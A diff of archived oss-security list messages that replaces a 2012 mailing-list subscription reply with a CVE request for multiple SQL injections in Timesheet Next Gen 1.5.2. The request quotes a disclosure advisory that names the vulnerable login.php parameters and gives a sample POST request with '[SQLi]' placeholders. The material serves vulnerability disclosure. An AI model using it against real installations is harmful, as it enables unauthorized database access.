@@ -1,23 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/01/27/9
-Message-ID: <20120127183048.GA7675@openwall.com>
-Date: Fri, 27 Jan 2012 22:30:48 +0400
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/16/4
+Message-ID: <20120416105541.GD25530@kludge.henri.nerv.fi>
+Date: Mon, 16 Apr 2012 13:55:41 +0300
+From: Henri Salo <henri@...v.fi>
 To: oss-security@...ts.openwall.com
-Subject: Re: Subscribe to linux-distros
+Cc: g13net@...il.com
+Subject: CVE-request: Timesheet Next Gen 1.5.2 Multiple SQLi
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Jan 27, 2012 at 04:33:26AM -0500, Ramon de C Valle wrote:
-> I'm a new member of Red Hat Security Response Team. Could you please
-> subscribe me to the linux-distros mailing list?
-> 
-> pub   2048R/E9A5A2DD 2011-09-14
->       Key fingerprint = 37C9 75D7 0092 D074 DA95  F229 191A 8A07 E9A5 A2DD
-> uid                  Ramon de C Valle <ramon@...hat.com>
-> uid                  Ramon de C Valle <rcvalle@...hat.com>
-> uid                  Ramon de C Valle <rdecarva@...hat.com>
-> sub   2048R/8E1B3C19 2011-09-14
+Can I get one 2012 CVE-identifier for Timesheet Next Gen 1.5.2 multiple SQL-injections. Thomas Richards said the vendor is working on the patch.
 
-Subscribed.
+http://sourceforge.net/apps/mantisbt/tsheetx/view.php?id=122
+http://osvdb.org/show/osvdb/79804
+http://secunia.com/advisories/48239/
 
-Alexander
+- Henri Salo
+
+http://seclists.org/bugtraq/2012/Mar/10
+"""
+# Exploit Title: Timesheet Next Gen 1.5.2 Multiple SQLi
+# Date: 02/23/12
+# Author: G13
+# Software Link: https://sourceforge.net/projects/tsheetx/
+# Version: 1.5.2
+# Category: webapps (php)
+#
+
+##### Vulnerability #####
+
+The login.php page has multiple SQL injection vulnerabilities. Both
+the 'username' and 'password'
+parameters are vulnerable to SQL Injection.
+
+The vulnerability exists via the POST method.
+
+##### Vendor Notification #####
+
+02/23/12 - Vendor Notified
+02/26/12 - Email sent to each developer, developer responds
+02/29/12 - Confirmation by developer requested
+03/02/12 - Disclosure
+
+##### Exploit #####
+
+http://localhost/timesheet/
+
+POST /timesheet/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:10.0.2)
+Gecko/20100101 Firefox/10.0.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://localhost/timesheet/login.php
+Cookie: PHPSESSID=3b624f789e37fa3bdade432da
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+redirect=&username=[SQLi]&password=[SQLi]&Login=submit
+"""
